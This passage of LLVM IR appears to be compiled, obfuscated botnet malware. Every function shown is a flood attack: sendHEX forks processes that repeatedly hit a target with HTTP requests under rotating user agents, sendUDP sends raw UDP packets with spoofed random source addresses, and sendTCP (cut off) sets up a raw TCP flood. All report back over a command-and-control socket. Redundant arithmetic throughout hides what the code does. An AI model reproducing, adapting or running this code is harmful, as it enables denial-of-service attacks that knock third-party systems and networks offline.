  %90 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %92 = call i64 @strlen(i8* %91) #10
  %93 = getelementptr inbounds i8, i8* %90, i64 %92
  %94 = call i8* @strcpy(i8* %93, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.84, i32 0, i32 0)) #2
  %95 = load i32, i32* %8, align 4
  %96 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %98 = call i64 @strlen(i8* %97) #10
  %99 = call i64 @write(i32 %95, i8* %96, i64 %98)
  %100 = load i32, i32* %8, align 4
  %101 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %102 = call i64 @read(i32 %100, i8* %101, i64 1)
  %103 = load i32, i32* %8, align 4
  %104 = call i32 @close(i32 %103)
  br label %105

; <label>:105:                                    ; preds = %36, %29
  %106 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %107 = sext i32 %106 to i64
  %108 = load i64, i64* %9, align 8
  %109 = load i32, i32* %6, align 4
  %110 = sext i32 %109 to i64
  %111 = sub i64 0, %110
  %112 = sub i64 %108, %111
  %113 = add nsw i64 %108, %110
  %114 = icmp sge i64 %107, %112
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %105
  call void @_exit(i32 0) #12
  unreachable

; <label>:116:                                    ; preds = %105
  br label %29

; <label>:117:                                    ; preds = %25
  br label %118

; <label>:118:                                    ; preds = %117
  %119 = load i32, i32* %7, align 4
  %120 = add i32 %119, 28020181
  %121 = add i32 %120, 1
  %122 = sub i32 %121, 28020181
  %123 = add nsw i32 %119, 1
  store i32 %122, i32* %7, align 4
  br label %21

; <label>:124:                                    ; preds = %21
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %21 = load i32, i32* %11, align 4
  %22 = sub i32 0, %20
  %23 = sub i32 0, %21
  %24 = add i32 %22, %23
  %25 = sub i32 0, %24
  %26 = add nsw i32 %20, %21
  store i32 %25, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %27 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %28 = call i32 (i8*, i8*, ...) @sprintf(i8* %27, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.85, i32 0, i32 0))
  store i32 0, i32* %14, align 4
  br label %29

; <label>:29:                                     ; preds = %71, %6
  %30 = load i32, i32* %14, align 4
  %31 = load i32, i32* %12, align 4
  %32 = icmp slt i32 %30, %31
  br i1 %32, label %33, label %76

; <label>:33:                                     ; preds = %29
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %37 = load i8*, i8** %8, align 8
  %38 = call i32 @rand() #2
  %39 = srem i32 %38, 36
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %40
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 (i8*, i8*, ...) @sprintf(i8* %34, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.86, i32 0, i32 0), i8* %35, i8* %36, i8* %37, i8* %42)
  %44 = call i32 @fork() #2
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %70

; <label>:46:                                     ; preds = %33
  br label %47

; <label>:47:                                     ; preds = %68, %46
  %48 = load i32, i32* %15, align 4
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %50 = icmp sgt i32 %48, %49
  br i1 %50, label %51, label %69

; <label>:51:                                     ; preds = %47
  %52 = load i8*, i8** %8, align 8
  %53 = load i16, i16* %9, align 2
  %54 = call i32 @socket_connect(i8* %52, i16 zeroext %53)
  store i32 %54, i32* %13, align 4
  %55 = load i32, i32* %13, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %68

; <label>:57:                                     ; preds = %51
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #10
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  br label %68

; <label>:68:                                     ; preds = %57, %51
  br label %47

; <label>:69:                                     ; preds = %47
  call void @exit(i32 0) #14
  unreachable

; <label>:70:                                     ; preds = %33
  br label %71

; <label>:71:                                     ; preds = %70
  %72 = load i32, i32* %14, align 4
  %73 = sub i32 0, 1
  %74 = sub i32 %72, %73
  %75 = add nsw i32 %72, 1
  store i32 %74, i32* %14, align 4
  br label %29

; <label>:76:                                     ; preds = %29
  ret void
}

declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %37, label %41

; <label>:37:                                     ; preds = %8
  %38 = call i32 @rand_cmwc()
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %46

; <label>:41:                                     ; preds = %8
  %42 = load i32, i32* %10, align 4
  %43 = trunc i32 %42 to i16
  %44 = call zeroext i16 @htons(i16 zeroext %43) #13
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  br label %46

; <label>:46:                                     ; preds = %41, %37
  %47 = load i8*, i8** %9, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %355

; <label>:52:                                     ; preds = %46
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %14, align 4
  store i32 %55, i32* %18, align 4
  %56 = load i32, i32* %12, align 4
  %57 = icmp eq i32 %56, 32
  br i1 %57, label %58, label %133

; <label>:58:                                     ; preds = %52
  %59 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %59, i32* %19, align 4
  %60 = load i32, i32* %19, align 4
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %65, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* @mainCommSock, align 4
  %64 = call i32 (i32, i8*, ...) @sockprintf(i32 %63, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %355

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %13, align 4
  %67 = add i32 %66, -723898441
  %68 = add i32 %67, 1
  %69 = sub i32 %68, -723898441
  %70 = add nsw i32 %66, 1
  %71 = sext i32 %69 to i64
  %72 = call noalias i8* @malloc(i64 %71) #2
  store i8* %72, i8** %20, align 8
  %73 = load i8*, i8** %20, align 8
  %74 = icmp eq i8* %73, null
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %65
  br label %355

; <label>:76:                                     ; preds = %65
  %77 = load i8*, i8** %20, align 8
  %78 = load i32, i32* %13, align 4
  %79 = sub i32 0, %78
  %80 = sub i32 0, 1
  %81 = add i32 %79, %80
  %82 = sub i32 0, %81
  %83 = add nsw i32 %78, 1
  %84 = sext i32 %82 to i64
  call void @llvm.memset.p0i8.i64(i8* %77, i8 0, i64 %84, i32 1, i1 false)
  %85 = load i8*, i8** %20, align 8
  %86 = load i32, i32* %13, align 4
  call void @RandString(i8* %85, i32 %86)
  %87 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %88 = load i32, i32* %11, align 4
  %89 = sub i32 0, %88
  %90 = sub i32 %87, %89
  %91 = add nsw i32 %87, %88
  store i32 %90, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %92

; <label>:92:                                     ; preds = %127, %123, %114, %76
  %93 = load i32, i32* %19, align 4
  %94 = load i8*, i8** %20, align 8
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %98 = call i64 @sendto(i32 %93, i8* %94, i64 %96, i32 0, %struct.sockaddr* %97, i32 16)
  %99 = load i32, i32* %22, align 4
  %100 = load i32, i32* %18, align 4
  %101 = icmp eq i32 %99, %100
  br i1 %101, label %102, label %115

; <label>:102:                                    ; preds = %92
  %103 = load i32, i32* %10, align 4
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %109

; <label>:105:                                    ; preds = %102
  %106 = call i32 @rand_cmwc()
  %107 = trunc i32 %106 to i16
  %108 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %107, i16* %108, align 2
  br label %109

; <label>:109:                                    ; preds = %105, %102
  %110 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %111 = load i32, i32* %21, align 4
  %112 = icmp sgt i32 %110, %111
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %109
  br label %132

; <label>:114:                                    ; preds = %109
  store i32 0, i32* %22, align 4
  br label %92

; <label>:115:                                    ; preds = %92
  %116 = load i32, i32* %22, align 4
  %117 = sub i32 0, 1
  %118 = sub i32 %116, %117
  %119 = add i32 %116, 1
  store i32 %118, i32* %22, align 4
  %120 = load i32, i32* %23, align 4
  %121 = load i32, i32* %15, align 4
  %122 = icmp eq i32 %120, %121
  br i1 %122, label %123, label %127

; <label>:123:                                    ; preds = %115
  %124 = load i32, i32* %16, align 4
  %125 = mul nsw i32 %124, 1000
  %126 = call i32 @usleep(i32 %125)
  store i32 0, i32* %23, align 4
  br label %92

; <label>:127:                                    ; preds = %115
  %128 = load i32, i32* %23, align 4
  %129 = sub i32 0, 1
  %130 = sub i32 %128, %129
  %131 = add i32 %128, 1
  store i32 %130, i32* %23, align 4
  br label %92

; <label>:132:                                    ; preds = %113
  br label %355

; <label>:133:                                    ; preds = %52
  %134 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %134, i32* %24, align 4
  %135 = load i32, i32* %24, align 4
  %136 = icmp ne i32 %135, 0
  br i1 %136, label %140, label %137

; <label>:137:                                    ; preds = %133
  %138 = load i32, i32* @mainCommSock, align 4
  %139 = call i32 (i32, i8*, ...) @sockprintf(i32 %138, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %355

; <label>:140:                                    ; preds = %133
  store i32 1, i32* %25, align 4
  %141 = load i32, i32* %24, align 4
  %142 = bitcast i32* %25 to i8*
  %143 = call i32 @setsockopt(i32 %141, i32 0, i32 3, i8* %142, i32 4) #2
  %144 = icmp slt i32 %143, 0
  br i1 %144, label %145, label %148

; <label>:145:                                    ; preds = %140
  %146 = load i32, i32* @mainCommSock, align 4
  %147 = call i32 (i32, i8*, ...) @sockprintf(i32 %146, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  br label %355

; <label>:148:                                    ; preds = %140
  store i32 50, i32* %26, align 4
  br label %149

; <label>:149:                                    ; preds = %157, %148
  %150 = load i32, i32* %26, align 4
  %151 = sub i32 0, %150
  %152 = sub i32 0, -1
  %153 = add i32 %151, %152
  %154 = sub i32 0, %153
  %155 = add nsw i32 %150, -1
  store i32 %154, i32* %26, align 4
  %156 = icmp ne i32 %150, 0
  br i1 %156, label %157, label %172

; <label>:157:                                    ; preds = %149
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %159 = call i32 @rand_cmwc()
  %160 = xor i32 %158, -1
  %161 = and i32 38743886, %160
  %162 = xor i32 38743886, -1
  %163 = and i32 %158, %162
  %164 = xor i32 %159, -1
  %165 = and i32 %164, 38743886
  %166 = and i32 %159, %162
  %167 = or i32 %161, %163
  %168 = or i32 %165, %166
  %169 = xor i32 %167, %168
  %170 = xor i32 %158, %159
  call void @srand(i32 %169) #2
  %171 = call i32 @rand() #2
  call void @init_rand(i32 %171)
  br label %149

; <label>:172:                                    ; preds = %149
  %173 = load i32, i32* %12, align 4
  %174 = icmp eq i32 %173, 0
  br i1 %174, label %175, label %176

; <label>:175:                                    ; preds = %172
  store i32 0, i32* %27, align 4
  br label %198

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* %12, align 4
  %178 = sub i32 32, 38536681
  %179 = sub i32 %178, %177
  %180 = add i32 %179, 38536681
  %181 = sub nsw i32 32, %177
  %182 = shl i32 1, %180
  %183 = add i32 %182, -1319540500
  %184 = sub i32 %183, 1
  %185 = sub i32 %184, -1319540500
  %186 = sub nsw i32 %182, 1
  %187 = xor i32 %185, -1
  %188 = and i32 -1930614544, %187
  %189 = xor i32 -1930614544, -1
  %190 = and i32 %185, %189
  %191 = xor i32 -1, -1
  %192 = and i32 %191, -1930614544
  %193 = and i32 -1, %189
  %194 = or i32 %188, %190
  %195 = or i32 %192, %193
  %196 = xor i32 %194, %195
  %197 = xor i32 %185, -1
  store i32 %196, i32* %27, align 4
  br label %198

; <label>:198:                                    ; preds = %176, %175
  %199 = load i32, i32* %13, align 4
  %200 = sext i32 %199 to i64
  %201 = sub i64 28, 1857848264049711723
  %202 = add i64 %201, %200
  %203 = add i64 %202, 1857848264049711723
  %204 = add i64 28, %200
  %205 = call i8* @llvm.stacksave()
  store i8* %205, i8** %28, align 8
  %206 = alloca i8, i64 %203, align 16
  %207 = bitcast i8* %206 to %struct.iphdr*
  store %struct.iphdr* %207, %struct.iphdr** %29, align 8
  %208 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %209 = bitcast %struct.iphdr* %208 to i8*
  %210 = getelementptr i8, i8* %209, i64 20
  %211 = bitcast i8* %210 to %struct.udphdr*
  store %struct.udphdr* %211, %struct.udphdr** %30, align 8
  %212 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 4
  %216 = load i32, i32* %27, align 4
  %217 = call i32 @GetRandomIP(i32 %216)
  %218 = call i32 @htonl(i32 %217) #13
  %219 = load i32, i32* %13, align 4
  %220 = sext i32 %219 to i64
  %221 = sub i64 0, %220
  %222 = sub i64 8, %221
  %223 = add i64 8, %220
  %224 = trunc i64 %222 to i32
  call void @makeIPPacket(%struct.iphdr* %212, i32 %215, i32 %218, i8 zeroext 17, i32 %224)
  %225 = load i32, i32* %13, align 4
  %226 = sext i32 %225 to i64
  %227 = sub i64 0, 8
  %228 = sub i64 0, %226
  %229 = add i64 %227, %228
  %230 = sub i64 0, %229
  %231 = add i64 8, %226
  %232 = trunc i64 %230 to i16
  %233 = call zeroext i16 @htons(i16 zeroext %232) #13
  %234 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.2* %235 to %struct.anon.3*
  %237 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %236, i32 0, i32 2
  store i16 %233, i16* %237, align 2
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %241 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.2* %241 to %struct.anon.3*
  %243 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %242, i32 0, i32 0
  store i16 %239, i16* %243, align 2
  %244 = load i32, i32* %10, align 4
  %245 = icmp eq i32 %244, 0
  br i1 %245, label %246, label %248

; <label>:246:                                    ; preds = %198
  %247 = call i32 @rand_cmwc()
  br label %253

; <label>:248:                                    ; preds = %198
  %249 = load i32, i32* %10, align 4
  %250 = trunc i32 %249 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #13
  %252 = zext i16 %251 to i32
  br label %253

; <label>:253:                                    ; preds = %248, %246
  %254 = phi i32 [ %247, %246 ], [ %252, %248 ]
  %255 = trunc i32 %254 to i16
  %256 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 0
  %258 = bitcast %union.anon.2* %257 to %struct.anon.3*
  %259 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %258, i32 0, i32 1
  store i16 %255, i16* %259, align 2
  %260 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %261 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon.2* %261 to %struct.anon.3*
  %263 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %262, i32 0, i32 3
  store i16 0, i16* %263, align 2
  %264 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %265 = bitcast %struct.udphdr* %264 to i8*
  %266 = getelementptr inbounds i8, i8* %265, i64 8
  %267 = load i32, i32* %13, align 4
  call void @RandString(i8* %266, i32 %267)
  %268 = bitcast i8* %206 to i16*
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 2
  %271 = load i16, i16* %270, align 2
  %272 = zext i16 %271 to i32
  %273 = call zeroext i16 @csum(i16* %268, i32 %272)
  %274 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 %273, i16* %275, align 2
  %276 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %277 = load i32, i32* %11, align 4
  %278 = sub i32 %276, -1078851789
  %279 = add i32 %278, %277
  %280 = add i32 %279, -1078851789
  %281 = add nsw i32 %276, %277
  store i32 %280, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %282

; <label>:282:                                    ; preds = %347, %343, %334, %253
  br label %283

; <label>:283:                                    ; preds = %282
  %284 = load i32, i32* %24, align 4
  %285 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %286 = call i64 @sendto(i32 %284, i8* %206, i64 %203, i32 0, %struct.sockaddr* %285, i32 16)
  %287 = call i32 @rand_cmwc()
  %288 = trunc i32 %287 to i16
  %289 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 0
  %291 = bitcast %union.anon.2* %290 to %struct.anon.3*
  %292 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %291, i32 0, i32 0
  store i16 %288, i16* %292, align 2
  %293 = load i32, i32* %10, align 4
  %294 = icmp eq i32 %293, 0
  br i1 %294, label %295, label %297

; <label>:295:                                    ; preds = %283
  %296 = call i32 @rand_cmwc()
  br label %302

; <label>:297:                                    ; preds = %283
  %298 = load i32, i32* %10, align 4
  %299 = trunc i32 %298 to i16
  %300 = call zeroext i16 @htons(i16 zeroext %299) #13
  %301 = zext i16 %300 to i32
  br label %302

; <label>:302:                                    ; preds = %297, %295
  %303 = phi i32 [ %296, %295 ], [ %301, %297 ]
  %304 = trunc i32 %303 to i16
  %305 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %306 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %305, i32 0, i32 0
  %307 = bitcast %union.anon.2* %306 to %struct.anon.3*
  %308 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %307, i32 0, i32 1
  store i16 %304, i16* %308, align 2
  %309 = call i32 @rand_cmwc()
  %310 = trunc i32 %309 to i16
  %311 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 3
  store i16 %310, i16* %312, align 4
  %313 = load i32, i32* %27, align 4
  %314 = call i32 @GetRandomIP(i32 %313)
  %315 = call i32 @htonl(i32 %314) #13
  %316 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 8
  store i32 %315, i32* %317, align 4
  %318 = bitcast i8* %206 to i16*
  %319 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 2
  %321 = load i16, i16* %320, align 2
  %322 = zext i16 %321 to i32
  %323 = call zeroext i16 @csum(i16* %318, i32 %322)
  %324 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 7
  store i16 %323, i16* %325, align 2
  %326 = load i32, i32* %32, align 4
  %327 = load i32, i32* %18, align 4
  %328 = icmp eq i32 %326, %327
  br i1 %328, label %329, label %335

; <label>:329:                                    ; preds = %302
  %330 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %331 = load i32, i32* %31, align 4
  %332 = icmp sgt i32 %330, %331
  br i1 %332, label %333, label %334

; <label>:333:                                    ; preds = %329
  br label %353

; <label>:334:                                    ; preds = %329
  store i32 0, i32* %32, align 4
  br label %282

; <label>:335:                                    ; preds = %302
  %336 = load i32, i32* %32, align 4
  %337 = sub i32 0, 1
  %338 = sub i32 %336, %337
  %339 = add i32 %336, 1
  store i32 %338, i32* %32, align 4
  %340 = load i32, i32* %33, align 4
  %341 = load i32, i32* %15, align 4
  %342 = icmp eq i32 %340, %341
  br i1 %342, label %343, label %347

; <label>:343:                                    ; preds = %335
  %344 = load i32, i32* %16, align 4
  %345 = mul nsw i32 %344, 1000
  %346 = call i32 @usleep(i32 %345)
  store i32 0, i32* %33, align 4
  br label %282

; <label>:347:                                    ; preds = %335
  %348 = load i32, i32* %33, align 4
  %349 = add i32 %348, -909345666
  %350 = add i32 %349, 1
  %351 = sub i32 %350, -909345666
  %352 = add i32 %348, 1
  store i32 %351, i32* %33, align 4
  br label %282

; <label>:353:                                    ; preds = %333
  %354 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %354)
  br label %355

; <label>:355:                                    ; preds = %353, %145, %137, %132, %75, %62, %51
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

declare i32 @usleep(i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %523

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  br label %523

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  br label %523

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %87

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub i32 32, -297470224
  %69 = sub i32 %68, %67
  %70 = add i32 %69, -297470224
  %71 = sub nsw i32 32, %67
  %72 = shl i32 1, %70
  %73 = sub i32 0, 1
  %74 = add i32 %72, %73
  %75 = sub nsw i32 %72, 1
